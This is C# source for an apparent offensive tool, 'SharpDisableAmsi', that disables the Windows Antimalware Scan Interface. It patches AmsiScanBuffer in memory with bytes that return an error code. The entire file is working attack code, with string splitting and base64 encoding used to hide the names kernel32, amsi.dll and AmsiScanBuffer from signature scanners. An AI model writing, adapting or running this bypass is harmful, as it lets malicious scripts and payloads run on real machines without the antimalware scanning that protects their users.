using System;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpDisableAmsi
{
    public class Program
    {
        [DllImport("ke" + "rne" + "l32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("ke" + "rne" + "l32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("ke" + "rne" + "l32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
        {
            Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
        }
        public static void Main(string[] args)
        {
            try
            {
                var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
                IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
                uint magicValue = 0x40;
                uint someNumber = 0;

                if (System.Environment.Is64BitOperatingSystem)
                {
                    var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                    VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicValue, out someNumber);
                    CopyData(bigBoyBytes, addr);
                }
                else
                {
                    var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

                    VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicValue, out someNumber);
                    CopyData(smallBoyBytes, addr);

                }
                Console.WriteLine("Patched A.M.S.I!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Couldn't patch A.M.S.I :(");
                Console.WriteLine("{0}", ex.Message);
            }
        }
    }
}
